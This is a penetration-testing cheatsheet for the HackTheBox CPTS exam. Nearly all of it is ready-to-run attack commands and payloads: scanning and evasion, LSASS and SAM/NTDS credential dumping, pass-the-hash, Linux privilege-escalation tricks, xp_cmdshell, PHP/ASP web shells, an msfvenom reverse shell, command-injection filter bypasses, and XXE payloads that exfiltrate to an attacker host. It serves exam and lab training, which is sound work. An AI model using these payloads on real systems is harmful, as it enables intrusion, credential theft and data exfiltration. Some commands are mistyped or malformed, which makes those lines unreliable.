# CPTS-cheatsheet
HackTheBox Certified Penetration Tester Specialist Cheatsheet

![Alt text](https://academy.hackthebox.com/storage/exam_overview_banners/Fpoo8YaykR3341XtswrcmuyLNcAK6bZ1WF86Ro6v.png)

The below is taken from https://github.com/zagnox/CPTS-cheatsheet and will be improved by myself

## 0. Environment Setup
- [Tmux](#tmux)
- [Note taking](#note-taking)
- Logging
- Scan output structure

## 1. Initial Access Phase
### 1.1 Network Discovery
If scope is unknown:
- [Address Scanning](#nmap-address-scanning)
- [Host Discovery](#nmap-host-discovery)

If hosts discovered:
- [Full Port Scan](#nmap-port-scan)
- [OS and Service Detection](#nmap-os-and-service-detection)
- [NSE Scripts](#nse-scripts)
- [Timing and Performance](#nmap-timing-and-performance)
- [Evasion and Spoofing](#firewall-evasion-and-spoofing)
- [Output](#output)
  
### 1.2 Service Enumeration
- If SMB → [SMB Enumeration](#smb)
- If MSSQL → [MSSQL Enumeration](#mssql)
- If DNS → [DNS Enumeration](#dns)
- If SNMP → [SNMP Enumeration](#snmp)
- If FTP → [FTP](#ftp)
- If NFS → [NFS](#nfs)
- If IMAP/POP3 → [IMAP POP3](#imap-pop3)
- If IPMI → [IPMI](#ipmi)
- If SSH → [Remote Management](#linux-remote-management-ssh)

### 1.3 Web Enumeration
- [Whatweb](#WhatWeb)
- [FUFF](#FUFF-fast-Web-Fuzzer)
- [Gobuster](#Gobuster-directory-dns-brute-force)
- [Attacking SQL](#attacking-sql)
- [SQLMap](#sqlmap)
- [CMS](#cms)
- [Apache](#Apache)
### 1.4 Credential Attacks
- [Password Attacks](#password-attacks)
  - [Password Mutations](#password-mutations)
  - [Remote Password Attacks](#remote-password-attacks)
  - [Windows Password Attacks](#windows-password-attacks)
  - [Linux Password Attacks](#linux-password-attacks)
  - [Cracking Passwords](#cracking-passwords)
- [Login Brute Forcing](#login-brute-forcing)
    - [Hydra](#hydra)
    - [Medusa](#medusa)
    - [CUPP](#CUPP)

## 2. Service-Specific Exploitation
- [Attacking SMB](#attacking-smb)
- [Attacking SQL](#attacking-sql)
- [Attacking Email Services](#attacking-email-services)
- [File Upload Attacks](#file-upload-attacks)
- [Command Injection Attacks](#command-injection-attacks)
- [Web Attacks](#web-attacks)
- [Apache Attacks](#apache-attacks)
  
## 3. Active Directory Methodology
### 3.1 AD Initial Enumeration
- [Initial Enumeration](#initial-enumeration)
- [Windows Password Attacks](#windows-password-attacks)
- [Password Spraying & Password Policies](#password-spraying-and-password-policies)
- [Trust Relationships](#trust-relationships-child-parent-trusts)
### 3.2 Credential Attacks in AD
- [ASREPRoasting](#asreproasting)
- [Kerberoasting](#kerberoasting)
- [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
- Potato Family
### 3.3 ACL & Privilege Escalation in AD
- [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
- Group membership abuse
- Token abuse
### 3.4 Domain Escalation
- [DCSync Attack](#dcsync-attack)
- Delegation abuse
- Trust abuse
### 3.5 Trust Exploitation
- [Miscellanous Configurations](#miscellanous-configurations)
### 3.6 AV Evasion / Living off the Land
- [Enumerating Disabling/Bypassing AV](#enumerating-and-bypassing-av)
- [Living Of The Land](#living-of-the-land)

## 4. Post-Exploitation
### 4.1 Credential Harvesting
- [Password Spraying & Password Policies](#password-spraying-and-password-policies)
- [Windows Password Attacks](#windows-password-attacks)
- [Linux Password Attacks](#linux-password-attacks)
### 4.2 Lateral Movement
- [Footprinting Services](#footprinting-services)
    - [FTP](#ftp)
    - [SMB](#smb)
    - [NFS](#nfs)
    - [MSSQL](#mssql)
- [Attacking Common Services](#attacking-common-services)
    - [Attacking SMB](#attacking-smb)
    - [Attacking SQL](#attacking-sql)
    - [Attacking Email Services](#attacking-email-services)

### 4.3 Privilege Escalation (Windows)
- [Cheat Sheet](#cheat-sheeet)
- [Attacking SMB](#attacking-smb)
- [Attacking SQL](#attacking-sql)
- [Enumerating Disabling/Bypassing AV](#enumerating-and-bypassing-av)
- [Living Of The Land](#living-of-the-land)


### 4.4 Privilege Escalation (Linux)
- [Attacking SMB](#attacking-smb)
- [Attacking SQL](#attacking-sql)
- [Linux-Priv-Esc](#linux-priv-esc)
  
## 5. Password Cracking Workflow
- [Password Mutations](#password-mutations)
- [Remote Password Attacks](#remote-password-attacks)
- [Linux Password Attacks](#linux-password-attacks)
- [Cracking Passwords](#cracking-passwords)
- [Login Brute Forcing](#login-brute-forcing)
    - [Hydra](#hydra)
## 6. Reporting Checklist
- Clean up artifacts and scripts
- Document all steps taken
- Provide recommendations for remediation
- Deliver final penetration test report


- [Useful Resources](#useful-resources)







  
## [Tmux](https://tmuxcheatsheet.com/)
```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
Control + B then [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]

#Take screenshot
[Ctrl] + [B] followed by [Alt] + [P] (prefix + [Alt] + [P])

```

#### note-taking

```
# Screenshot with eyewitness and output from nmap
eyewitness --web -x web_discovery.xml -d

```

#### Scan Ouput Structure 
```
External Penetration Test - <Client Name>
•	Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
•	Client Points of Contact
•	Credentials
•	Discovery/Enumeration
  o	Scans
  o	Live hosts
•	Application Discovery
  o	Scans
  o	Interesting/Notable Hosts
•	Exploitation
  o	<Hostname or IP>
  o	<Hostname or IP>
•	Post-Exploitation
  o	<Hostname or IP>
  o	<Hostname or IP>



```

## [NMAP](https://www.stationx.net/nmap-cheat-sheet/)
#### Nmap address scanning
```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```
#### Nmap scanning techniques
```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1

# Fin and Xmas
nmap -sX 192.168.1.1; nmap sF 192.138.1.1
```
#### Nmap Host Discovery
```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1

```

#### Nmap port scan
```
# Port scan from service name
nmap 192.168.1.1 -p http, https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 -top-ports 200
```

#### Nmap OS and service detection
```
# Aggresive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV -version-intensity 7 192.168.1.1

# OS detecion
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O -osscan-guess 192.168.1.1
```

#### Nmap timing and performance
```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```
#### NSE Scripts
```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```
#### Firewall Evasion and Spoofing
```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs
nmap 192.168.1.1 -D 192.168.1.11, 192.168.1.12, 192.168.1.13, 192.168.1.13 
```
#### Output
```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```

## Footprinting Services
##### FTP
```
# Connect to FTP
ftp <IP>

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```
##### SMB
```

# Connect to a specific SMB share
smbclient //<FQDN IP>/<share>

# Interaction with the target using RPC
rpcclient -U "" <FQDN IP>

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares

# Enumerating SMB shares using null session authentication with valid session
crackmapexec smb INLANEFREIGHT.LOCAL --shares -u 'user' -p 'Welcome1'

#SMBMap
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

#donwload: smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 --download 'Department Shares/path/to/file'

```
##### NFS
```
# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
```
##### DNS
```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver.
dig axfr <domain.tld> @<nameserver>
```

##### IMAP POP3
```
# Log in to the IMAPS service using cURL
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service
openssl s_client -connect <FQDN/IP>:pop3s
```

#### SNMP
```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service.
onesixtyone -c community-strings.list <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```
##### MSSQL
```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```
##### IPMI
```
# IPMI version detection
msf6 auxiliary(scanner/ipmi/ipmi_version)

# Dump IPMI hashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```
##### Linux Remote Management SSH
```
# Enforce password-based authentication
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password
```
## Web Enumeration

#### WhatWeb
```
# Basic scan
whatweb http://target.com

# Aggressive scan
whatweb -a 3 http://target.com

# Scan multiple hosts
whatweb -i hosts.txt
```
#### FUFF (Fast Web Fuzzer)
```
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt:FUZZ

# With file extensions
ffuf -u http://target.com/FUZZ -w wordlist.txt:FUZZ -e .php,.txt,.html

# Virtual host fuzzing
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt:FUZZ

# Filter by status code
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,302

# Filter by response size
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 4242

#to not print logs and and progress bar use the flags -s and optionally -ic

# Recursion
ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v

#Test - subdomain if DNS isn't resolving, and then try vhost with -H and check for size response to filter it. 

# Fuzz for Parameters (Very important)
ffuf -w burp-parameter-names.txt:FUZZ u http://vhost.academy.htb:PORT/admin/admin.php?FUZZ=key -fs 900

# Parameter Fuzzing POST
ffuf -w burp-parameter-names.txt:FUZZ u http://vhost.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' 

```
#### Gobuster (Directory DNS Brute Force)
```
# Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html

# DNS brute force
gobuster dns -d target.com -w subdomains.txt

# Vhost brute force
gobuster vhost -u http://target.com -w wordlist.txt
```

#### CMS

```
#WordPress
#Version and footprinting
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
#Enum Users
/wp-login.php (users)
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

#Joomla
#Version and footprinting
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
droopescan scan joomla --url http://dev.inlanefreight.local/
python2.7 joomlascan.py -u http://dev.inlanefreight.local
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

#Drupal
#Version and footprinting
curl -s http://drupal.inlanefreight.local | grep Drupal
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
droopescan scan drupal -u http://drupal.inlanefreight.local


```

#### Apache

```
#apache-tomcat
```

## Password Attacks

##### Password Mutations
```
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt

# Search PSReadline history
foreach($user in ((ls C:\users).fullname)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue | Select-String "password"
}

#findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Recursive file search across all user directories and common locations
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.cfg,*.config,*.xml -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false | Select-Object Path, LineNumber, Line
```

##### Remote Password Attacks
```
# Uses dehashed.py
sudo python3 dehashed.py -q inlanefreight.local -p

# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>

# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <ip> -u <username> -p <password> --ntds
```
##### Windows Password Attacks
```
# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
Get-Process lsass

# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.
pypykatz lsa minidump /path/to/lsassdumpfile

# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save

# Uses move in Windows to transfer a file to a specified file share over the network.
move sam.save \\<ip>\NameofFileShare

# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# LaZagne for quick find of passwords 
start LaZagne.exe all 
```
##### Linux Password Attacks
```
# Script that can be used to find .conf, .config and .cnf files on a Linux system.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Script that can be used to find credentials in specified file types.
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Script that can be used to find common database files.
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

# Uses Linux-based find command to search for text files.
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

##### Linux Priv Esc

```
#System Info, OS and version
cat /etc/os-release
cat /etc/lsb-release
uname -a

#Environment Info, PATH, variables, CPU, shells, printers
echo $PATH; env; uname -a; lscpu; cat /etc/shells; lpstat

#PATH Manipulation, Add current directory to PATH (potential hijack)
echo $PATH
PATH=.:${PATH}

#Users & Processes, Root processes and logged-in users
ps aux | grep root
ps au

#Home Directories, List user homes
ls /home

#SSH Keys, Check for private keys
ls -l ~/.ssh

#Command History, Review user history
history

#Sudo Privileges, Check allowed commands
sudo -l

#Groups, Check sudo group membership
getent group sudo

#Writable Directories, Find world-writable dirs
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

#Writable Files, Find world-writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

#Mounted Drives, Check fstab and mounts
cat /etc/fstab
cat /etc/fstab | grep -v "#" | column -t
lsblk

#Hidden Files & Configs, Locate hidden and config files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
find / -type d -name ".*" -ls 2>/dev/null
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

#History Files, Look for saved histories
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

#Cron Jobs, Scheduled tasks
ls -la /etc/cron.daily/
ls -la /etc/cron.daily/

#Processes via /proc, Inspect running commands
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

#Network, Routing table
netstat -rn

#DNS / AD Check, Domain resolution
cat /etc/resolv.conf

#Scripts, Find shell scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

#SUID Binaries, Find SUID files
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

#SGID Binaries, Find SGID files
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

#Capabilities, Enumerate capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

#Shared Libraries, Inspect dependencies
ldd /bin/ls
readelf -d payroll | grep PATH

#Exploit Compilation, Compile C exploit
gcc kernel_expoit.c -o kernel_expoit

#Shared Library Compilation, Create malicious .so
gcc src.c -fPIC -shared -o /development/libshared.so

#LD_PRELOAD PrivEsc, Abuse sudo + preload
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

#Processes Monitoring, Observe cron/jobs
./pspy64 -pf -i 1000

#strace Debugging, Trace system calls
strace ping -c1 10.129.112.20

#GTFOBins Check, Match installed binaries
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done

#tcpdump PrivEsc, Abuse sudo tcpdump
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

#LXD Group PrivEsc, Abuse container privileges
id
lxd init
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash

#Alternative LXD Flow
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t

#Docker PrivEsc, Abuse docker group
id
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh

#NFS Shares, Enumerate and mount
showmount -e 10.129.2.12
sudo mount -t nfs 10.129.2.12:/tmp /mnt

#tmux Shared Session, Hijack session
tmux -S /shareds new -s debugsess

#Logrotate Exploit Conditions
#Requires writable logs + root execution + vulnerable version (3.8.6, 3.11, 3.15.0, 3.18.0)

#Screen Version Check, Known vuln
screen -v

#Writable Files (Alt), Find interesting writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

#Process Monitoring Tool
pspy32 or pspy64

#Security Audit Tool
./lynis audit system

```


##### Cracking Passwords
```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash
```
## Attacking Common Services

##### Attacking SMB

```
# Network share enumeration using smbmap.
smbmap -H 10.129.14.128

smbclient -N -L //10.129.14.128

smbmap -H 10.129.14.128 -r notes

smbmap -H 10.129.14.128 --download"notes\note.txt"

smbmap -H 10.129.14.128 --upload test.txt"notes\test.txt"

smbclient //server_name/share_name -U username%password

#With Domain
smbclient //server_name/share_name -U domain\\username%password


#RCE connect with impacket. 
impacket-psexec administrator:'Password123!'@10.10.110.17

crackmapexec smb 10.10.110.0/24 -u administrator -p'Password123!' --loggedon-users

crackmapexec smb 10.10.110.17 -u Administrator -p'Password123!' -x'whoami' --exec-method smbexec

crackmapexec smb 10.10.110.17 -u administrator -p'Password123!' --sam

crackmapexec smb DC01 -u user -p password -d INLANEFREIGHT.LOCAL
#If the above command shows (Pwn3d!) you are part of Domain Admins.

#PtH
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294
#PTH Mimikatz
sekurlsa::pth /user:Administrator /domain:. /ntlm:<hash> /run:cmd.exe

# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>

#login using PtH
impacket-psexec administrator@10.129.43.13 -hashes aad3b435b51404eeaad3b435b51404ee:7asdadwafawfhawwg356163af1a54
```

##### Attacking SQL
```
# SQLEXPRESS
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

# Hash stealing using the xp_dirtree command in MSSQL.
EXEC master..xp_dirtree '\\10.10.110.17\share\'

# Hash stealing using the xp_subdirs command in MSSQL.
EXEC master..xp_subdirs '\\10.10.110.17\share\'

# Identify the user and its privileges used for the remote connection in MSSQL.
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]

# mssqlclient.py
mssqlclient.py INLANEFREIGHT/account@172.16.5.50
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
                                                    
xp_cmdshell
xp_cmdshell "whoami /priv"
xp_cmdshell 'whoami'

#iF xp_cmdshell is not enabled:
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

```
##### Attacking Email Services
```
# DNS lookup for mail servers for the specified domain
host -t MX microsoft.com

#  DNS lookup for mail servers for the specified domain
dig mx inlanefreight.com | grep "MX" | grep -v ";"

#  DNS lookup of the IPv4 address for the specified subdomain.
host -t A mail1.inlanefreight.htb.

# Connect to the SMTP server.
telnet 10.10.110.20 25

# SMTP user enumeration using the RCPT command against the specified host
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# Brute-forcing the POP3 service.
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

# Testing the SMTP service for the open-relay vulnerability.
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```

##### File Upload Attacks  
```
#Basic PHP File Read
<?php echo file_get_contents('/etc/passwd'); ?>
#Basic PHP Command Execution
<?php system('hostname'); ?>
#Basic PHP Web Shell
<?php system($_REQUEST['cmd']); ?>
#Basic ASP Web Shell
<% eval request('cmd') %>
#Generate PHP reverse shell
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

#whitelist Bypass
shell.jpg.php
shell.php.jpg

%20, %0a, %00, %0d0a, /, .\, ., …	Character Injection - Before/After Extension

Content-Types	#List of All Content-Types
File Signatures	#List of File Signatures/Magic Bytes
```
##### Command Injection Attacks
```

# Injection operator - semicolon
;

# Injection operator - new line
\n

# Injection operator - background
&

# Injection operator - pipe
|

# Injection operator - AND
&&

# Injection operator - OR
||

# Injection operator - sub-shell (Linux)
``

# Injection operator - sub-shell (Linux)
$()

# URL-encoded semicolon
%3b

# URL-encoded new line
%0a

# URL-encoded background
%26

# URL-encoded pipe
%7c

# URL-encoded AND
%26%26

# URL-encoded OR
%7c%7c

# URL-encoded sub-shell (Linux)
%60%60

# URL-encoded sub-shell (Linux)
%24%28%29

# Linux - view environment variables
printenv

# Linux - tab instead of space
%09

# Linux - space bypass with IFS
${IFS}

# Linux - comma replaced with space
{ls,-la}

# Linux - slash bypass
${PATH:0:1}

# Linux - semicolon bypass
${LS_COLORS:10:1}

# Linux - shift character by one
$(tr '!-}' '"-~'<<<[)

# Linux - character insertion
' 
"

# Linux - character insertion with variable
$@

# Linux - character insertion with escape
\

# Linux - case manipulation
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Linux - lowercase variable trick
$(a="WhOaMi";printf %s "${a,,}")

# Linux - reverse string
echo 'whoami' | rev

# Linux - execute reversed command
$(rev<<<'imaohw')

# Linux - base64 encode command
echo -n 'cat /etc/passwd | grep 33' | base64

# Linux - execute base64 encoded command
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# Windows PowerShell - view environment variables
Get-ChildItem Env:

# Windows - tab instead of space
%09

# Windows CMD - space bypass
%PROGRAMFILES:~10,-5%

# Windows PowerShell - space bypass
$env:PROGRAMFILES[10]

# Windows CMD - backslash bypass
%HOMEPATH:~0,-17%

# Windows PowerShell - backslash bypass
$env:HOMEPATH[0]

# Windows - character insertion
'

# Windows - character insertion
"

# Windows CMD - escape character insertion
^

# Windows - case manipulation
WhoAmi

# Windows PowerShell - reverse string
"whoami"[-1..-20] -join ''

# Windows PowerShell - execute reversed command
iex "$('imaohw'[-1..-20] -join '')"

# Windows PowerShell - base64 encode command
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Windows PowerShell - execute base64 encoded command
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

```
##### Web Attacks
```
#HTTP Method - VERB Tampering

change GET for POST, HEAD, OPTIONS, PATCH, PUT to see how the server reacts
in Caido or Burp Suite change from GET to POST using built in feature

-X OPTIONS set HTTP method with Curl

#IDOR
In URL parameters & APIs
In AJAX Calls
By understanding reference hashing/encoding
By comparing user roles

#Command Description
md5sum MD5 hash a string
base64 Base64 encode a string

#XXE
#Define External Entity to a URL
<!ENTITY xxe SYSTEM "http://localhost/email.dtd">

Define External Entity to a file path
<!ENTITY xxe SYSTEM "file:///etc/passwd"> 

Read PHP source code with base64 encode filter
<!ENTITY company SYSTEM "php://filter/convert.base64- encode/resource=index.php">

Reading a file through a PHP error
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

Reading a file OOB exfiltration
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

```

## Active Directory

#### Initial Enumeration
```
# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Captura Network Traffic
sudo -E wireshark

# Use tcpdump to captura traffic
sudo tcpdump -i ens224

# Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
sudo responder -I ens224 -A -v
#browse on the logs
ls -l /usr/share/responder/logs

#
nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum-list.txt

